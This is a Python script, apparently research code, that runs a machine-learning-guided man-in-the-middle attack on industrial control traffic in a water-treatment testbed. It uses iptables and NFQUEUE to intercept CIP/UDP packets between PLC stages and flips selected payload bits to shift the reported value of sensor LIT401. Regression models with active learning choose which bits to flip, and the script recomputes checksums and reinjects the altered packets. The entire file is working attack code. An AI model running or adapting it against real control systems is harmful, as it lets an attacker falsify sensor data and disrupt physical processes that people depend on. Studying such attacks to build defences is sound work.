#!/usr/bin/env python 
# -*- coding:utf-8 -*-
from scapy.all import *
import os
import random
import time
import numpy as np
from bitdump import *
import binascii
from modify_bit import *
import dissector.CIP_sequence
from netfilterqueue import NetfilterQueue
from AL_utils import *
from sklearn.externals import joblib
from sklearn.ensemble import GradientBoostingRegressor
from sklearn.svm import LinearSVR
from preprocess import *

# index12_50 = [74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 97, 138, 139, 140, 141, 142, 143, 144,
#               145, 146, 147, 148, 149, 150, 151, 152, 153, 186, 187, 188, 189, 190, 191, 192, 193, 195, 196, 197, 198,
#               199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 221, 222,
#               223, 224, 225, 239, 240, 241, 253, 254, 255, 256, 257, 269, 270, 271, 272, 273, 302, 303, 304, 305, 318,
#               319, 320, 321, 334, 335, 336, 337, 350, 351, 352, 353, 367, 368, 369, 384]
# index12_40 = [74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 95, 96, 97]
# index12_28 = [74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 95, 96, 97, 142, 143, 144, 145, 190, 200,
#               201]
# index10_40 = [74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 95, 96, 97, 138, 139, 140, 141, 142, 143,
#               144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 206, 207, 209, 217]



# p2_50 = np.zeros(len(index12_50), dtype=int)
# p2_40 = np.zeros(len(index12_40), dtype=int)
# p2_28 = np.zeros(len(index12_28), dtype=int)
# p2_40 = np.zeros(len(index10_40), dtype=int)
p2_50 = np.zeros(256, dtype=int)
p2_40 = np.zeros(176, dtype=int)
p2_28 = np.zeros(80, dtype=int)
p0_40 = np.zeros(176, dtype=int)
vector = np.hstack((p2_50, p2_40, p2_28, p2_40))
vector = vector.tolist()
modify_time = 0
modify_flag = 0
modify_index = 0
success_times = 0
failed_times = 0
count = 0
start_time = 0
time_interval = 30

#######################
# import model
#######################
sensor = 'LIT401'
method = 'GBDT'
algorithm = 'EMCM'
stage_ip1 = '192.168.0.42'
stage_ip2 = '192.168.0.40'

model = joblib.load(sensor+'/origin/'+sensor+'_'+method+'_40min.pkl')

#######################
# import first batch
#######################
batch = np.load('0801total.npy')
bits = np.load(sensor+'/origin/'+sensor+'_'+'bits_40min.npy')
label = np.loadtxt(sensor+'/origin/'+sensor+'_'+ 'diff30_40min.txt')
print 'load complete'

#############################
# generate first model_list
#############################
if algorithm == 'EMCM':
    block_size=int(np.shape(bits)[0]**(1/3))+1
    if method == 'linear':
        bootstrap_linear_model(bits,label,block_size,4)
    if method == 'GBDT':
        bootstrap_GBDT_model(bits, label, block_size, 4)
    model_list = ['model/bootstrap_' + method + '_example0.pkl', 'model/bootstrap_' + method + '_example1.pkl',
                  'model/bootstrap_' + method + '_example2.pkl',
                  'model/bootstrap_' + method + '_example3.pkl']
vectors = bits.tolist()
pv = label.tolist()
list_total = []
pv_total = []
j = 0

#####################################
#define classifier(gbdt and linear)
#####################################
def train_gbdt(x, y):
    model_gbdt = GradientBoostingRegressor(
        loss='ls'
        , learning_rate=0.1
        , n_estimators=100
        , subsample=0.8
        , min_samples_split=2
        , min_samples_leaf=1
        , max_depth=50
        , init=None
        , random_state=None
        , max_features=None
        , alpha=0.9
        , verbose=0
        , max_leaf_nodes=None
        , warm_start=False
    )
    model_gbdt.fit(x,y)
    return model_gbdt


def train_linear(x, y):
    model_linear = LinearSVR(C=1, tol=1e-5,max_iter=1000)
    model_linear.fit(x, y)
    return model_linear


#####################################
#define search algorithm
# (top10 vector according to their changes before and after bitflips)
#####################################
def search(vector,model):
    vector_list = []
    v_list = []
    y0 = model.predict([vector[0]])
    for i in vector:
        y = model.predict([i])
        diff = abs(y-y0)
        v_list.append(diff)
    temp_list = v_list[:]
    temp_list.sort(reverse=True)
    for i in range(10):
        vector_list.append(vector[v_list.index(temp_list[i])])
    return vector_list

def save(filename, contents):
  fh = open(filename, 'w')
  fh.write(contents)
  fh.close()


def handle_packet(packet):
    global index_alter
    global modify_flag
    global modify_time
    global count
    global vector
    global vector_list
    global start_time
    global model
    global j

    pkt = IP(packet.get_payload())
    '''extract pv'''
    if pkt.haslayer("Raw"):
        if pkt["IP"].src == stage_ip1:
            if len(pkt[Raw]) == 32:
                stri = binascii.hexlify(str(pkt))
                with open("string.txt", 'w') as i:
                    i.write(stri)

    '''start altering packets'''
    if modify_flag == 1:
        for v in vector_list:
            if time.time() - modify_time <= time_interval:
                if pkt.haslayer('Raw'):
                    if pkt['IP'].src == stage_ip1 and len(pkt['Raw']) == 32:
                        rawpkt = binascii.unhexlify(reconstruct_packet(pkt,v,4,1))
                        pktnew = IP(rawpkt)
                        del pktnew['IP'].chksum
                        del pktnew['UDP'].chksum
                        packet.set_payload(str(pktnew))
                    if pkt['IP'].src == stage_ip1 and len(pkt['Raw']) == 22:
                        rawpkt = binascii.unhexlify(reconstruct_packet(pkt, v, 4, 2))
                        pktnew = IP(rawpkt)
                        del pktnew['IP'].chksum
                        del pktnew['UDP'].chksum
                        packet.set_payload(str(pktnew))
                    if pkt['IP'].src == stage_ip1 and len(pkt['Raw']) == 10:
                        rawpkt = binascii.unhexlify(reconstruct_packet(pkt, v, 4, 3))
                        pktnew = IP(rawpkt)
                        del pktnew['IP'].chksum
                        del pktnew['UDP'].chksum
                        packet.set_payload(str(pktnew))
                    if pkt['IP'].src == stage_ip2 and len(pkt['Raw']) == 22:
                        rawpkt = binascii.unhexlify(reconstruct_packet(pkt, v, 4, 4))
                        pktnew = IP(rawpkt)
                        del pktnew['IP'].chksum
                        del pktnew['UDP'].chksum
                        packet.set_payload(str(pktnew))

            else:
                # update model
                temp_pv = np.loadtxt('pv_diff.txt')
                for num in range(10):
                    vectors.append(v)
                    pv.append(temp_pv)
                print 'start_training', j
                if method == 'GBDT':
                    model = train_gbdt(vectors, pv)
                if method == 'linear':
                    model = train_linear(vectors, pv)
                joblib.dump(model, sensor + '/' + method + '/' + sensor + '_' + method + '_'+algorithm+'_' + str(j) + ".pkl")
                print 'training over', j
                j += 1
                start_time = time.time()
                if algorithm == 'EMCM':
                    if method == 'GBDT':
                        bootstrap_GBDT_model(vector, pv, block_size, 4)
                    if method == 'linear':
                        bootstrap_linear_model(vector, pv, block_size, 4)
                modify_time = time.time()
        modify_flag = 0
    else:
        '''search for the related bits'''
        if time.time() - start_time >= 5:
            vector = np.hstack((p2_50, p2_40, p2_28, p2_40))
            np.savetxt('stage4old.txt',vector)
            vector2 = np.loadtxt('stage1new.txt')
            vector3 = np.loadtxt('stage2new.txt')
            vector4 = np.loadtxt('stage3new.txt')
            vector = np.hstack((vector, vector2, vector3, vector4))
            vector = vector.tolist()
            print "vector", vector
            vector_temp = []
            # flip according to Correlation
            for i in range(2752):
                temp = bit_flip(vector, i)
                if i == 583:
                    temp = bit_flip(temp, 1279)
                if i == 1279:
                    temp = bit_flip(temp, 583)
                # if i == 1955:
                #     temp = bit_flip(temp, 1959)
                if i == 1959:
                    temp = bit_flip(temp, 1955)
                if i == 2643:
                    temp = bit_flip(temp, 2647)
                if i == 2647:
                    temp = bit_flip(temp, 2643)
                vector_temp.append(temp)
            vector_temp = np.array(vector_temp)
            if algorithm == 'EMCM':
                if method == 'GBDT':
                    vector_list = EMCM_GBDT(model, 4, model_list, len(vector_temp), vector_temp, 100)
                if method == 'linear':
                    vector_list = EMCM_linear(model, 4, model_list, len(vector_temp), vector_temp)
            elif algorithm == 'EBCM':
                vector_list = search(vector_temp, model)
            print "vector_list:", vector_list
            modify_flag = 1
            modify_time = time.time()
        elif pkt.haslayer("Raw"):
            if pkt["IP"].src == stage_ip1:
                if len(pkt[Raw]) == 32:
                    a = bitdump(pkt[Raw])
                    save('p2_50.txt',binascii.hexlify(bytes(pkt[Raw])))
                    for j in range(len(a)):
                        p2_50[j] = a[j]
                if len(pkt[Raw]) == 22:
                    a = bitdump(pkt[Raw])
                    save('p2_40.txt',binascii.hexlify(bytes(pkt[Raw])))
                    for j in range(len(a)):
                        p2_40[j] = a[j]
                if len(pkt[Raw]) == 10:
                    a = bitdump(pkt[Raw])
                    save('p2_28.txt',binascii.hexlify(bytes(pkt[Raw])))
                    for j in range(len(a)):
                        p2_28[j] = a[j]
            if pkt["IP"].src == stage_ip2:
                if len(pkt[Raw]) == 32:
                    a = bitdump(pkt[Raw])
                    save('p0_40.txt',binascii.hexlify(bytes(pkt[Raw])))
                    for j in range(len(a)):
                        p0_40[j] = a[j]
    packet.accept()


if __name__ == '__main__':
    os.system('iptables -t mangle -A FORWARD -j NFQUEUE --queue-num 1')
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, handle_packet)
    try:
        print "[*] starting NFQUEUE"
        start_time = time.time()
        print "start_time", start_time
        nfqueue.run()
    except KeyboardInterrupt:
        time.sleep(1)
        os.system('sudo iptables -t mangle -F')
        os.system('sudo sh start_lvl0.sh')
        print "[*] stopping NFQUEUE"
        nfqueue.unbind()
